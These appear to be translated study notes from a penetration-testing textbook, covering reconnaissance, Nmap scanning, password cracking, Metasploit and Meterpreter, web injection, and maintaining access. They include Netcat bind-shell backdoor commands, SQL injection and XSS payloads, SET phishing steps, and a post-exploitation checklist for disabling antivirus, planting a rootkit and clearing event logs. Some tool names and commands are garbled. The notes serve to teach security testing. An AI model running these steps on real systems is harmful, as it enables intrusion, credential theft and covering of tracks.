# Penetration Testing Practice Guide: Must-Know Tools and Methods (Original Book 2nd Edition)

- [Reconnaissance] (#Reconnaissance)
- [Scan] (#Scan)
- [Vulnerability Exploitation] (#Exploit)
- [Maintain Access](#Maintain Access)

## Reconnaissance

- Active Reconnaissance – Including direct interaction with the target system, during this process, the target may record our IP address and activities. 
- Passive reconnaissance – utilizing information available online. 

### HTTrack website copy machine

 is able to create an exact offline copy of the target website. 

 It should be noted that cloned websites are easy to be tracked and are also considered extremely offensive. Do not use this tool without prior authorization. 

 Pay special attention to information such as "news" and "announcements", which may accidentally reveal useful information. Also search for job postings posted online by target companies, which often detail the technology they use. 

### Google command

- site – only display search results from a specific website
- intitle, allintitle – search for web page title – allintitle:index of
- inurl – search for content that contains certain Websites with specific characters – inurl:admin – inurl:login
-cache – search snapshots, which may contain web pages and files that have been removed from the original website, and can also reduce the traces left on the target server. 
- filetype – Search for a specific file extension. 

Recommended websites [Google Hacking Database](https://www.exploit-db.com/)

 Places like UseNet, Google Groups, BBS, Facebook, Twitter, etc. can also collect information (social engineering ). 

### The Harvester mines and utilizes email addresses

 to quickly and accurately create directories for email addresses and their subdomains. 

### Whois

 obtains specific information related to the target, including IP address, corporate DNS hostname, and contact information such as address and phone number. 

Pay special attention to the DNS server. Use the host command to translate the name into an IP address. 

### Netcraft

A good place to collect information [Netcraft](http://www.netcraft.com/)

After searching, it will display the URLs that it can find that contain the search keywords. and some useful information. 

### The Host tool

 can translate IP addresses into host names, and it can also translate host names into IP addresses. 

Host The manual and help documentation are worth reading. 

### Extract information from DNS The 

DNS server contains the complete list of target internal IP addresses. 

 Use NS Lookup to query the DNS server and possibly obtain records of various hosts known to the DNS server. 
Dig is also a powerful tool for extracting information from DNS. 

Fierce (what to do when a zone transfer fails), this script first attempts to complete a zone transfer from the specified domain. If the process fails, Fierce will attempt to send a series of queries to the target DNS server to brute force the host name. . This is an extremely effective way to discover additional targets. 

### Extract information from the email server

 If the target company has its own email server, you can send a batch file with an empty attachment or calc.exe to the target company. A non-malicious executable email that is designed to have the company's mail server check the email and then send a bounce. We can try to extract server information. 

### MetaGooFil

 is used to extract metadata (metadata), which is defined as data about data. 

### ThreatAgent Drone attack

 first register an account at [threatagent](http://www.threatagent.com/). 

ThreatAgent creates a complete profile of the target by using a number of different sites, tools, and techniques. 

### Social engineering

The process of attacking the weaknesses of "human nature". 

### Supplement

 tools: Maltego, Robertex

## Scan

- Use Ping packets to verify whether the system is running
- Use Nmap to scan the system’s ports
- Use Nmap Script Engine (NSE) to further query the target
- Use Nessus to scan system vulnerabilities

### ping and ping Scan

ping is a specific type of network packet called an ICMP echo request packet that is used to send specific types of network traffic to certain special interfaces on a computer or network device. 

Perform a ping scan using the tool FPing. 

### The purpose of port scanning

 is to identify which ports are open and which services are enabled on the target system. 

 Scanning tool: Nmap

### Using Nmap for TCP scanning

 is the most basic and stable among port scans, and completely completes the three-way handshake process. 

For example: nmap -sT -p- -Pn 192.168.31.120-254 (-iL path_to_the_text_file)

### Use Nmap for SYN scanning

Nmap The default scanning method, the most commonly used. Only completing the first two steps of the three-way handshake, it was fast and in some cases concealed to a certain extent. 

For example: nmap -sS -p- -Pn 192.168.31.120

### Use Nmap for UDP scanning

If we want to find UDP-based services, we need to control Nmap to create UDP packets to scan. 

 For example: nmap -sU 192.168.31.120

UDP scan is very slow. 

 Since the UDP protocol does not require a response from the recipient for communication, it is difficult for Nmap to distinguish whether the UDP port is open or the scanned data packet is filtered. To make the target return more useful corresponding information, we add the -sV parameter. Typically -sV is used for version scanning. i After version scanning is enabled, Nmap will send additional detection information to each scan to the "OPEN|FILTERED" port. This additional probe attempts to identify the service by sending specially crafted packets, which often successfully triggers a response from the target. 

### Use Nmap for Xmas scanning

RFC refers to a document, either an annotation document or a technical specification about an existing technology or standard, which provides us with a large number of specific system internals Operational details. This is where you can look for potential weaknesses or vulnerabilities in your system. The RFC document of 

TCP describes this: When the packet received by the port does not have the SYN, ACK or RST flag set (this is the case for the packets scanned by Xmas), RST data is sent if the port is closed. Packet in response, ignored if enabled. If the system we scan follows the recommendations of the TCP RFC document, we can send this kind of irregular packet to determine the current status of the port in the target system. 

 For example: nmap -sX -p- -Pn 192.168.31.120

 Note: In general, Xmas Tree scanning and Null scanning are targeted at computers running Unix and Linux systems. 

### Using Nmap for Null scanning

In many cases, Null scanning is the opposite of Xmas Tree scanning, because Null scanning uses packets without any marks (all empty). 

The target system responds exactly the same to a Null scan as it does to an Xmas Tree scan. The benefit of using these two scans is that they can bypass simple packet filtering and access control lists (ACLs) in some cases. 

 For example: nmap -sN -p- -Pn 192.168.31.120

### The NMAP scripting engine 

NSE extends the capabilities of Nmap beyond traditional port scanning. 

 For example: nmap –script banner 192.168.31.120

### Port scan summary

- The “-sV” parameter is used for version scanning. 
- The "-T" parameter can change the port scan speed option. 
- The "-O" parameter can be used to identify the operating system. 

### Vulnerability scanning

 tool: Nessus

[Nessus Activation Code Installation](http://static.tenable.com/documentation/Nessus_Activation_Code_Installation.pdf)

### Supplement

 tools: [OpenVAS](http://www.openvas.org/)

 Deep learning Nmap: [insecure.org](http://insecure.org/)

# # Vulnerability Exploitation

 Simply put, vulnerability exploitation is the process of obtaining system control permissions. 

### Use Medusa to gain access to remote services

Medusa is a tool that attempts to gain access to remote authentication services through parallel login brute force cracking. 

For example: medusa -h target_ip -u username -P path_to_password_dictionary -M authentication_service_to_attack

About the dictionary: The password dictionary contains a list of various possible passwords. Offline password cracking tools such as JtR can process millions of passwords per second, but Medusa and Hydra can only process one or two passwords per second, so choosing the right dictionary is important. 

### Metasploit: Hack

 the Hugh Jackman WayBasic terminology:

An exploit program refers to a prepackaged set of code that will be sent to a remote system. The 
 attack payload is also a piece of code used to perform certain tasks, such as installing software, creating users, and opening backdoors to the target system. 

 Specific steps: 

- Based on the results of the Nessus scan, you can find the target's weaknesses and uninstalled patches
- Open the terminal and start Metasploit
- Enter the "search" command to search for vulnerability attack programs% 0A- Enter the "use" command and select the appropriate vulnerability attack program
- Enter the "show payloads" command to display the available attack loads
- Enter the "set" command to select the attack load
- Enter "show options" to view all options that need to be set before conducting a vulnerability attack on the target
- Enter the "set" command to set the options listed above
- Enter the "exploit" command to launch a vulnerability attack on the target 

Commonly used attack payloads for intruding windows: 

Metasploit payload name | Payload description
--- | ---
windows/adduser | Create a new user in the local administrator group on the target computer 
windows/exec | Execute the windows binary file (.exe)
windows/shell_bind_tcp on the target computer | Start a command line shell on the target computer and wait for the connection 
windows/shell_reverse_tcp | The target computer connects back to the attacker and starts a command line shell
windows/meterpreter/bind_tcp on the target computer | The target computer installs Meterpreter and waits for the connection
windows/meterpreter/reserse_tcp | Installs Meterpreter on the target computer and then creates a reverse link to the attacker Connect 
windows/vncinject/bind_tcp | Install VNC on the target computer and wait for a connection
windows/vncinject/reserse_tcp | Install VNC on the target computer and return a VNC connection to the target

Meterpreter: A usable attack payload that provides the attacker with a powerful command line shell, Can be used to interact with the target computer. It runs entirely in memory and never uses hard drive space, improving stealth and helping to evade anti-virus software and confuse forensic tools. Note: The permissions of Meterpreter runtime are related to the attacked program. 

### John the Ripper: The King of Password Cracking

 No matter how advanced our technical abilities are, passwords still seem to be the most common method of protecting data and restricting system access. 

### The most basic password cracking process

- Locate and download the password hash file of the target system
- Use tools to convert the hashed password into a plain text password

## # Local password cracking

Most ​​systems store encrypted password hashes in a single location. Windows-based systems are stored in a file called SAM (Security Account Manager), in the "C:\Windows\System32\Config\" directory. This file has some security measures. After the operating system is started, the SAM file will be locked at the same time. In addition, the entire SAM file is encrypted and invisible. So we want to bypass these restrictions. The best way is to boot the target computer into another operating system. At this time, we can access the SAM file. Of course, the file is still encrypted. After entering another operating system, you must first mount the local hard disk and browse to find the SAM file. Then you can use the Samdump2 tool to extract the hashes and enter the following command "samdump2 system SAM > /tmp/hashes.txt". 

Note: Raw hashing may require an extra step on some Windows systems. Use the Bkhive tool to extract the Syskey boot key (Bootkey) from the system configuration (Hive). First enter "bkhivve system sys_key.txt" to extract the key, and then use Samdump2 to attack. 
After getting the password hash, you can use John the Ripper to crack it. For example: john /tmp/hashes.txt –format=nt

### Remote password cracking

 After using Metasploit to obtain the remote shell on the target, run the Meterpreter session and enter the "hashdump" command. Get the username and password hashes of the target computer. 

### Simple Linux Password Cracking and Privilege Escalation

Linux systems contain password hashes in a "shadow" file, "/etc/shadow", which only privileged users can access. But we can use an edited password list in /etc/passwd and use a special feature of JtR to merge /etc/shadow and /etc/passwd , which outputs a list containing the original hashes. Enter the command: unshadow /etc/passwd /etc/passwd > /tmp/linux_hashes.txt. After the extraction is successful, it can be cracked. Most Linux uses the SHA hash encryption algorithm. 

### Password Reset: Breakthrough

 Password Reset directly overwrites the SAM file and creates a new password for any user on Windows. This process does not require knowledge of the original password, but does require physical access to the computer. 

 Use the Kali CD or USB flash drive to boot the target system, mount the system's hard drive containing the SAM file, and then use the "chntpw" command to reset the password. Type "chntpw -h" to see the complete list of options and available parameters. Execute "chntpw -i /mnt/sda1/WINDOWS/system32/config/SAM" to reset the administrator password. 

### Wireshark: Sniffing traffic 

 Sniffing is the process of obtaining and viewing the traffic entering and leaving a certain network. It is an effective way to obtain system access. 

 Some very common protocols send sensitive information over the network without encryption, called clear text. 

Promiscuous and non-promiscuous network modes: 

- In non-promiscuous mode the network interface card will only pass specific network traffic directed to the local address. 
- Promiscuous mode forces the network card to accept all incoming data packets. 

 In order to successfully sniff traffic whose destination address is not originally directed to your computer, you must ensure that your network card is running in promiscuous mode. 

### Macof: In some cases, we can make the switch act like a hub, broadcasting traffic to all ports. 

 Most switches have limited memory to store a matching table containing MAC addresses and corresponding port numbers. By exhausting this memory and flooding the matching table with a large number of forged MAC addresses, it is possible to The switch cannot read or access this table, and the switch will simply broadcast the traffic to all ports, which is called a "fail-open". Note that the switch can also be set to "fail closed." There is a tool Macof in the 

Dsniff tool set that can generate thousands of random MAC addresses to flood the switch. For example: macof -i eth0 -s 192.168.18.2

 Note: Using Macof will generate a lot of network traffic and is easy to be discovered. 

 Fireshark is a network protocol analysis tool that can quickly and easily view and capture network traffic. Be sure to enable or configure at least one network interface before use. 

### Armitage: The superstar among intrusion tools

Armitage is a BUI-driven front-end program that runs on Metasploit. It contains functions that can be used to automate the entire penetration process. You only need to enter the IP of the target. address. When using 
, first enter "service postgresql start" to start the PostgreSQL service. 

### Supplementary 

 tools: Hydra brute force password cracking tool, RainbowCrack uses rainbow table to crack passwords, command line tool tcpdump, Ettercap for man-in-the-middle attack, search Exploit-DB. 

 Learning vulnerability exploitation techniques can start by learning buffer overflows. 

### Social Engineering

Social engineering is the oldest technique used to gain access to an organization or an individual computer. 

The Social Engineering Toolkit (SET) is an exploit framework dedicated to social engineering. 

### About SET

SET's flagship attack vector is the network attack vector, which has a high success rate and takes advantage of credibility. 

 focuses on two attacks: Java applet attack method and "The Credential Havester" (credential harvester). 

Java script steps:

1. Install SET and be ready to match our configuration (make sure SET has access to the Internet)
2. Register a domain name that looks trustworthy
3. Send a message to the company Block an email with a credible excuse and a link to our malicious domain name
4. Get Shell

### Web-based vulnerability exploitation

 Several basic ideas for Web intrusion:

- The ability to intercept requests leaving the browser. The use of interception proxy is key, you can use it to edit the value of the variable and then send it to the web application. At its core, web transactions are applications that accept requests from browsers and serve pages based on inbound requests. A large part of each request are the variables that go with the request, and these variables specify the page that is returned to the user. 
 - The ability to find all web pages, directories and other files that make up a web application. The goal of this activity is to provide you with a deep understanding of the attack surface, provided by automated "crawler" tools. 
- The ability to analyze web application responses and check for vulnerabilities. SQL injection, cross-site scripting (XSS) and file path manipulation attacks (directory traversal) all exploit these vulnerabilities. 

### Scan the Web server: Nikto

Nikto is a Web server vulnerability scanning tool that can automatically scan the Web server for expired and unpatched software, and also automatically retrieve dangerous files residing on the server. 

 For example: nikto -h 192.168.18.132 -p 1-1000

### W3AF: It’s not just what it looks like

W3af is a We resource scanning and vulnerability exploitation tool. 

### Web crawler: crawl the target website

 tool: Webscarab

Switch to the full-featured mode "Use full-featured interface", and then use the proxy function to configure the browser, "Manual proxy configuration" > HTTP Proxy: "127.0.0.1", Port: "8008" > Check "Use this proxy server for all protocols". 

Note: First, make sure that WebScarab is running before using it as a proxy. Second, when surfing through a local proxy, all https traffic shows an invalid certificate error. 

### Use Web Scarab to intercept requests

 Running Webscarab in proxy mode, we can prevent, intercept or even change the data before reaching the browser or after leaving the browser, manipulate or view HTTP requests and responses capabilities would be a serious security risk. 
 is first configured to use the "Lite Interface" mode. Do not select the "Intercept Request" and "Intercept Response" checkboxes before you are ready to start testing, because it may cause the website browsing speed to be extremely slow. 
 Viewing HTTP responses and requests can also be used to discover usernames and passwords. Many of these fields are Base64 encoded and require a tool to decode them. 

### Code Injection Attack

 Most of the current Web applications use interpretive programming languages ​​​​and architectural patterns of background databases for storing information to dynamically generate the data content required by users. The key to mastering injection attacks is to understand what an interpreted language is and how it works. The purpose of sending manipulated input or queries to a target computer is to cause the target computer to execute unexpected commands or return unexpected information to the attacker. 

For example: SELECT * FROM users WHERE uname = 'admin' and pwd = '' or 1 = 1 –

### Cross-site scripting: The browser that trusts the website

 Cross-site scripting is A process of injecting scripts into web applications. The injected script is saved in the original web page, and all browsers that access the web page will run or process this script. Cross-site scripting attacks occur when the injected script actually becomes part of the original code. Cross-site scripting focuses on attacking the client. 

For example: <script> alert("XSS Test") < /script>

### Zed Attack Proxy: Catch them all

OWASP's ZAP is a full-featured Web intrusion toolkit that provides Key features include blocking proxies, crawlers and vulnerability scanning. 

 Before using it, you must configure the browser to use a proxy, and the port number is 8080. 

### Supplement

 experimental environment: [WebGoat](https://www.owasp.org/index.php/Main_Page); [DVWA](http://www.dvwa.co. UK/)
Tools: Burp Proxy, Paros Proxy

## Maintaining Access

 Many exploits are ephemeral. After gaining control of the target system, the first task is to migrate the shell so that it can function permanently. This is usually achieved using a backdoor. 

### Netcat: The Swiss Army Knife 

Netcat is a tool that runs communications and network traffic from one computer to another and is the go-to choice for backdoors. 

Netcat runs in server mode or client mode. When acting as a client, it can connect to other services through the network. It can use any port on the local computer to connect to any port on the remote target computer. When running as a server, it acts as a listener, waiting to accept connections passed from the outside world. 

 command: nc -l -p 1337 starts Netcat and puts it in listening mode, waiting for information on port 1337. 

 command: nc 192.168.18.132 1337 causes Netcat to connect to port 1337 on the target IP. 

Note: Once the Netcat connection is closed, you need to restart the Netcat program to establish the connection. If you use the Windows version of Netcat, you can use the parameter "-L" instead of "-l" to maintain the connection status. If you want to run it permanently, you need to modify the windows registry. 

 command: nc -l -p 7777 > virus.exe forces the target to listen on port 7777 and store the received information in "virus.exe". 

 Command: nc 172.16.45.129 7777 < virus.exe Upload files from the attack machine. 

Finally we can bind Netcat to a process and make this process accessible to remote connections. Using the parameter "-e", Netcat will execute any program specified after the parameter, which is very useful for configuring a backdoor shell on the target computer. 

linux command: nc -l -p 12345 -e /bin/sh

windows command: nc -L -p 12345 c:\Windows\System32\cmd.exe

### Netcat's mysterious family member: Cryptcat

 The disadvantage of Netcat is that all traffic flowing through the Netcat server and client is in clear text. Anyone viewing the traffic or sniffing the connection can see and monitor the information transferred between computers. Cryptcat uses twofish for encryption. 

### Rootkit

Rootkit operates in the relatively low-level kernel of the operating system. It is generally used to hide files or programs and keep backdoor access concealed. 

Note: You must ensure that the client has permission to use Rootkit before using Rootkit for penetration testing. 

Hacker Defender: A powerful rootkit. 

### Rootkit Detection and Defense

 We know that in order to configure and install Rootkits, administrator rights must be used. Therefore, the first step to avoid Rootkits is to reduce user rights. Second, install, use and maintain the latest version of the software. Third, monitor the incoming and outgoing traffic on your network. Fourth, perform port scans on the system regularly and record every port opened on each system. Use some tools that can discover hidden files and rootkits, such as Rootkit Revealer, vice, etc. 

### Meterpreter: Omnipotent

Meterpreter basic command: 

 command | Function
--- | ---
cat file_name | Display the content of the specified file
clearev | Clear the target machine application All events reported in program, system and security logs 
download <source_file><destination_file> | Download the specified file from the target to the local host
edit | Provide a VIM editor that can make changes to the document
execute -file_name | Run/execute the specified file on the target
getsystem | The command meterpreter attempts to elevate the permissions to the highest level
hashdump | Locates and displays the username and hash on the target, which can be copied into text for John the Ripper to crack
idletime | Displays the time the machine has been inactive
keyscan_dump | Display keystrokes currently captured from the target computer (keyscan_start must be run first) 
keyscan_start | Start recording keystrokes on the target (in order to capture keystrokes, must be moved to the explorer.exe process) 
keyscan_stop | Stop recording user keystrokes 
kill pid_number | Stop the specified process (the process ID can be found by running the ps command) 
migrate | Move the meterpreter shell to another running process 
ps | Print a list of all processes running on the target
screenshot | Provide screenshots from the target machine
search -f file_name | Search for the specified file on the target machine
sysinfo | Provide relevant system information of the target machine
upload <source_file><destination_file> | Upload the specified file from your attack machine to the target machine

A simple method:

1. Exploit the vulnerability and use the Meterpreter attack payload 
2 on the target. Use the "migrate" command to transfer Meterpreter to unknown processes. For example, service host (svchost.exe)
3. Use the "kell" command to disable the antivirus software
4. Use the "shell" command to access the command prompt of the target machine, and use the "netsh advfirewall firewall" command to change the Windows firewall settings (use The connection or port can be opened)
5. With antivirus disabled, use the "upload" command to upload a file containing rootkit and other tools (nmap, Metasploit, John the Ripper, etc.)
6. Use the "execute -f" command to install the rootkit
7. If the rootkit does not contain a backdoor, use "execute -f" to install Netcat as a permanent backdoor
8. Use the "reg" command to modify the registry to ensure Netcat persistence 
9. Use the "hashdump" command to dump the password hashes and use John to crack the password
10. Use the "edit" command to configure the rootkit.int file, hide the uploaded files, backdoors, and newly opened windows
11. Establish a new connection from the attack machine to the target and test the uploaded backdoor
12. Use the "clearev" command to clear the event log 
13. Attack the next target

### Supplement

Ncat: The modern version of Netcat is an integral part of Nmap and adds support for SSL and IPV6. 
